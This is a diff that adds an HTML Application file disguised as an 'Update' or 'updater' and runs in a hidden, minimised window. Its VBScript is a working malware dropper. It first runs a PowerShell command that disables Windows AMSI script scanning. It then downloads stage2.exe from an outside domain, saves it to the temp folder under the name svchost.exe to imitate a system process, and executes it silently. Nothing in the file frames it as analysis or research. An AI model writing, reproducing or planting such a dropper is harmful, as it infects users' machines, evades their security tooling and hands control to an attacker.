@@ -1,0 +1,50 @@
+<html>
+<head>
+<title>Update</title>
+<HTA:APPLICATION ID="oHTA" 
+    APPLICATIONNAME="updater" 
+    BORDER="none" 
+    CAPTION="no" 
+    SHOWINTASKBAR="no" 
+    SINGLEINSTANCE="yes" 
+    SYSMENU="no" 
+    WINDOWSTATE="minimize" 
+/>
+<script language="VBScript">
+    ' 1. AMSI Bypass
+    On Error Resume Next
+    Dim wsh, cmd
+    Set wsh = CreateObject("WScript.Shell")
+    
+    ' Patches AmsiInitFailed to disable script scanning in memory
+    cmd = "powershell -w hidden -c ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""
+    wsh.Run cmd, 0, True
+    
+    ' 2. Download Final Stage
+    Dim xhr, stream, tempPath
+    Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xhr.Open "GET", "https://dicerigx.app/stage2.exe", False
+    xhr.Send
+    
+    If xhr.Status = 200 Then
+        tempPath = wsh.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
+        
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1 ' Binary
+        stream.Open
+        stream.Write xhr.responseBody
+        stream.SaveToFile tempPath, 2
+        stream.Close
+        
+        ' 3. Execute
+        wsh.Run tempPath, 0, False
+    End If
+    
+    ' 4. Close HTA instantly
+    window.close
+</script>
+</head>
+<body>
+    <!-- Keep body empty -->
+</body>
+</html>
